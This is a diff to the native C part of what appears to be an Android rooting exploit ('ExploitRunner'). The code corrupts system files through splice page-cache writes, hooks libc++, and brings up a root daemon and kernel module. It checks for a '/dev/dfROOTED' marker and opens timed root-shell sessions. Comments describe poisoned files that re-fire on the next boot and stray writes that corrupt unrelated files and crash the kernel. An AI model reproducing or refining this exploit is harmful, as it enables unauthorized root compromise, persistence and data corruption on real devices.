@@ -281,10 +281,6 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         }
         if (i % 32 == 0) {
             REPORTLN("%zu ...", i * 16);
-            /* o1s v77: throttle splice burst HARD (300ms/512B). v74's
-             * 200ms didn't stop OOM-kills (#142: malloc-fail SIGSEGVs in
-             * daemons+init, no hook involved). Reap (Java) + throttle. */
-            usleep(300000);
         }
     }
 
@@ -428,7 +424,7 @@ static size_t patch_verify_pread(const char *path, const char *payload,
 
 /* o1s: write + verify + retry (loopback UDP can drop post-splice packets
  * before ESP decrypt; recompute IVs from current content each round). */
-static int g_round0_bad = 0; /* o1s v72: stray-write meter (see below) */
+static int g_round0_bad = 0; /* o1s: stray-write meter (see below) */
 static int patch_checked(const char *path, const char *payload, size_t len,
                          size_t foff, struct Reporter *reporter) {
     for (int round = 0; round < 5; round++) {
@@ -613,11 +609,6 @@ static int createOrphanProcess(struct Reporter *reporter) {
 
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
-/* v82f auto-ladder: talk to our own daemon BEFORE cleanup (restore-kill
- * lesson: post-cleanup probes can never work — the worker sleeps through
- * restore and crashes on wakeup. Human timing missed the window 3 nights
- * running, so the app now probes itself deterministically, in-window.
- * Pure libc, no JNI. reporter = nativeRunAll's `reporter` variable. */
 static int sud_connect(void) {
     int fd = socket(AF_UNIX, SOCK_STREAM, 0);
     struct sockaddr_un a;
@@ -631,24 +622,7 @@ static int sud_connect(void) {
     }
     return fd;
 }
-static void auto_ladder(struct Reporter *reporter) {
-    int fd;
-    REPORTLN("=== AUTO-LADDER (in-window, pre-cleanup) ===");
-    /* probe-only (o1s): echo/touch ladder adimlari kaldirildi, grant
-     * dogrudan sh-exec uzerinden calisiyor. Sifir-fork probe kok
-     * dogrulamasi olarak duruyor. */
-    fd = sud_connect();
-    if (fd < 0) {
-        REPORTLN("probe: CONNECT FAILED");
-    } else {
-        shutdown(fd, SHUT_WR);
-        close(fd);
-        sleep(3);
-        REPORTLN("probe: dfROOTED %s, dfPROBE(accepted) %s",
-                 has_marker("/dev/dfROOTED") ? "YES ***ROOTED***" : "NO",
-                 has_marker("/dev/dfPROBE") ? "true" : "false");
-    }
-}
+
 static int is_fresh(const char *p, time_t t0) {
     struct stat st;
     return stat(p, &st) == 0 && st.st_mtime >= t0;
@@ -710,7 +684,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
 
     rc = 2;
     usleep(500000);
-    /* o1s v72 stray filter: round-0 mismatches mean splice blocks
+    /* o1s stray filter: round-0 mismatches mean splice blocks
      * landed wrong (somewhere!); retries fix the TARGET files but the
      * stray victims stay corrupt (zram BUG_ON #133-139 proven pattern).
      * Abort disasters (>150 first-try bad blocks); the rest proceed at
@@ -754,13 +728,11 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
     time_t t0 = time(NULL);
-    /* o1s v52+: ko FIRST (dfr0), sud SECOND (dfm0). SUCCESS needs BOTH:
-     * ko without daemon = permissive only; daemon without ko = useless.
-     * (v38's sud-first broke ko-first and stranded permissive.) */
+    /* o1s: ko FIRST (dfr0), sud SECOND (dfm0). SUCCESS needs BOTH:
+     * ko without daemon = permissive only; daemon without ko = useless. */
     int saw_dfm0 = 0, saw_dfr0 = 0, saw_dfwb = 0;
 
-    /* o1s: 30s marker window (user demand: 90s watched nothing happen).
-     * Healthy chain completes in <10s. */
+
     for (int elapsed = 0; elapsed < 30000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
@@ -779,18 +751,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
                 rc = 0;
                 REPORTLN("***SUCCESS*** (daemon + ko confirmed, wb-closed: %s)",
                          saw_dfwb ? "YES" : "NO");
-                auto_ladder(reporter);
-                /* Fast mode (boot): 300s serve BEKLENMEZ ama cleanup
-                 * ILLAKI yapilir. Worker cleanup'ta olur (beklenen);
-                 * kko + mount'lar zaten uygulanmistir. */
                 if (!g_fast_mode) {
-                    /* Serve window (v83: 300s shell sessions): the worker dies
-                 * at cleanup, so the daemon's lifetime = this window. Each
-                 * RUN buys one ~5min root-shell session (reboot per session;
-                 * poisoned files across reboot just auto-fire next boot).
-                 * Mine risk grows with window length; 300s is the trade.
-                 * 1sn dilimler: g_window_close set edilirse (load flow'un
-                 * islemi bitti) pencere erken kapanir, cleanup hemen kosar. */
                     int sec;
                     for (sec = 0; sec < 300 && !g_window_close; sec++) {
                         if (sec % 150 == 0)
@@ -813,10 +774,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
     REPORTLN("***FAILED***: check logs");
 done:
     if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
-    /* o1s v76: cleanup ALWAYS (user demand, old behavior). Daemon-less
-     * runs have nothing in flight worth protecting; poisoned pages
-     * confuse the next attempt more than restore IO costs. */
-    REPORTLN("\n=== cleanup ===");
+    REPORTLN("=== cleanup ===");
     restore_hook(&libcxx_r, reporter);
     fadvise_drop(kCrashDump, reporter);
     free(libcxx_r.shell_orig);
